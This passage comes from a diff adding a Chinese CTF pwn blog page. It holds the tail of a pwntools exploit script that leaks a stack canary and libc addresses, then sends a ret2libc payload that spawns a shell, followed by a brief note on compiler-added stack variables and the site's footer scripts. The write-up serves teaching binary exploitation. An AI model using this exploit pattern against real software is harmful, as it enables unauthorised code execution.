+    canary<span style="color:#f92672">=</span>u32(p<span style="color:#f92672">.</span>recv(<span style="color:#ae81ff">3</span>)<span style="color:#f92672">.</span>rjust(<span style="color:#ae81ff">4</span>,<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#39;</span>))
+    p<span style="color:#f92672">.</span>recv()
+    print(<span style="color:#e6db74">&#34;canary: &#34;</span>,hex(canary))
+    payload2<span style="color:#f92672">=</span><span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;a&#39;</span><span style="color:#f92672">*</span>(<span style="color:#ae81ff">0x4c</span><span style="color:#f92672">-</span><span style="color:#ae81ff">0x0c</span>)<span style="color:#f92672">+</span>p32(canary)<span style="color:#f92672">+</span><span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;a&#39;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">12</span><span style="color:#f92672">+</span>p32(puts_plt)<span style="color:#f92672">+</span>p32(e<span style="color:#f92672">.</span>symbols[<span style="color:#e6db74">&#34;main&#34;</span>])<span style="color:#f92672">+</span>p32(puts_got)
+    p<span style="color:#f92672">.</span>send(payload2)
+    p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">&#34;he flag!</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>)
+    puts_addr<span style="color:#f92672">=</span>u32(p<span style="color:#f92672">.</span>recv(<span style="color:#ae81ff">4</span>))
+    print(puts_addr)
+    libc_base <span style="color:#f92672">=</span> puts_addr <span style="color:#f92672">-</span> libc<span style="color:#f92672">.</span>sym[<span style="color:#e6db74">&#39;puts&#39;</span>]
+    system_addr <span style="color:#f92672">=</span> libc_base <span style="color:#f92672">+</span> libc<span style="color:#f92672">.</span>sym[<span style="color:#e6db74">&#39;system&#39;</span>]
+    binsh_addr <span style="color:#f92672">=</span> libc_base <span style="color:#f92672">+</span> libc<span style="color:#f92672">.</span>search(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;/bin/sh&#39;</span>)<span style="color:#f92672">.</span>__next__()
+
+    p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">&#34;u are?</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>)
+    p<span style="color:#f92672">.</span>send(payload1)
+    payload3<span style="color:#f92672">=</span><span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;a&#39;</span><span style="color:#f92672">*</span>(<span style="color:#ae81ff">0x4c</span><span style="color:#f92672">-</span><span style="color:#ae81ff">0xc</span>)<span style="color:#f92672">+</span>p32(canary)<span style="color:#f92672">+</span><span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;a&#39;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">12</span><span style="color:#f92672">+</span>p32(system_addr)<span style="color:#f92672">+</span><span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;aaaa&#39;</span><span style="color:#f92672">+</span>p32(binsh_addr)
+    p<span style="color:#f92672">.</span>send(payload3)
+    p<span style="color:#f92672">.</span>interactive()
+main()
+</code></pre></div><h3 id="小插曲">小插曲<a hidden class="anchor" aria-hidden="true" href="#小插曲">#</a></h3>
+<p>实践中发现，在函数调用栈中除了该有的局部变量，有时会出现一些奇怪的变量，这是由编译器决定的，一般用于存储寄存器上下文。</p>
+<p><img loading="lazy" src="3.png" alt="3"  />
+</p>
+
+
+  </div>
+
+  <footer class="post-footer">
+<nav class="paginav">
+  <a class="prev" href="https://zeroy.site/articles/CTFpwn1/">
+    <span class="title">« </span>
+    <br>
+    <span>[PWN.0x00]函数调用栈结构与栈迁移</span>
+  </a>
+  <a class="next" href="https://zeroy.site/articles/noya/">
+    <span class="title"> »</span>
+    <br>
+    <span>基于go-cqhttp的机器人NoyaBot</span>
+  </a>
+</nav>
+
+  </footer><script src="https://utteranc.es/client.js"
+        repo="zeroy0410/zeroy0410.github.io"
+        issue-term="pathname"
+        label="Comment"
+        theme="github-light"
+        crossorigin="anonymous"
+        async>
+</script>
+</article>
+    </main>
+    
+<footer class="footer">
+    <span>&copy; 2022 <a href="https://zeroy.site/">zeroy&#39;s blog</a></span>
+    <span>
+        Powered by
+        <a href="https://gohugo.io/" rel="noopener noreferrer" target="_blank">Hugo</a> &
+        <a href="https://git.io/hugopapermod" rel="noopener" target="_blank">PaperMod</a>
+    </span>
+</footer>
+<a href="#top" aria-label="go to top" title="Go to Top (Alt + G)" class="top-link" id="top-link" accesskey="g">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentColor">
+        <path d="M12 6H0l6-6z" />
+    </svg>
+</a>
+
+<script>
+    let menu = document.getElementById('menu')
+    if (menu) {
+        menu.scrollLeft = localStorage.getItem("menu-scroll-position");
+        menu.onscroll = function () {
+            localStorage.setItem("menu-scroll-position", menu.scrollLeft);
+        }
+    }
+
+    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
+        anchor.addEventListener("click", function (e) {
+            e.preventDefault();
+            var id = this.getAttribute("href").substr(1);
+            if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({
+                    behavior: "smooth"
+                });
+            } else {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView();
+            }
+            if (id === "top") {
+                history.replaceState(null, null, " ");
+            } else {
+                history.pushState(null, null, `#${id}`);
+            }
+        });
+    });
+
+</script>
+<script>
+    var mybutton = document.getElementById("top-link");
+    window.onscroll = function () {
+        if (document.body.scrollTop > 800 || document.documentElement.scrollTop > 800) {
+            mybutton.style.visibility = "visible";
+            mybutton.style.opacity = "1";
+        } else {
+            mybutton.style.visibility = "hidden";
+            mybutton.style.opacity = "0";
+        }
+    };
+
+</script>
+<script>
+    document.getElementById("theme-toggle").addEventListener("click", () => {
+        if (document.body.className.includes("dark")) {
+            document.body.classList.remove('dark');
+            localStorage.setItem("pref-theme", 'light');
+        } else {
+            document.body.classList.add('dark');
+            localStorage.setItem("pref-theme", 'dark');
+        }
+    })
+
+</script>
+<script>
+    document.querySelectorAll('pre > code').forEach((codeblock) => {
+        const container = codeblock.parentNode.parentNode;
+
+        const copybutton = document.createElement('button');
+        copybutton.classList.add('copy-code');
+        copybutton.innerText = 'copy';
+
+        function copyingDone() {
+            copybutton.innerText = 'copied!';
+            setTimeout(() => {
+                copybutton.innerText = 'copy';
+            }, 2000);
+        }
+
+        copybutton.addEventListener('click', (cb) => {
+            if ('clipboard' in navigator) {
+                navigator.clipboard.writeText(codeblock.textContent);
+                copyingDone();
+                return;
+            }
+
+            const range = document.createRange();
+            range.selectNodeContents(codeblock);
+            const selection = window.getSelection();
+            selection.removeAllRanges();
+            selection.addRange(range);
+            try {
+                document.execCommand('copy');
+                copyingDone();
+            } catch (e) { };
+            selection.removeRange(range);
+        });
+
+        if (container.classList.contains("highlight")) {
+            container.appendChild(copybutton);
+        } else if (container.parentNode.firstChild == container) {
+            
+        } else if (codeblock.parentNode.parentNode.parentNode.parentNode.parentNode.nodeName == "TABLE") {
+            
+            codeblock.parentNode.parentNode.parentNode.parentNode.parentNode.appendChild(copybutton);
+        } else {
+            
+            codeblock.parentNode.appendChild(copybutton);
+        }
+    });
+</script>
+<script type="text/javascript"
+  src="https://cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-AMS-MML_HTMLorMML">
+</script></body>
+
+</html>
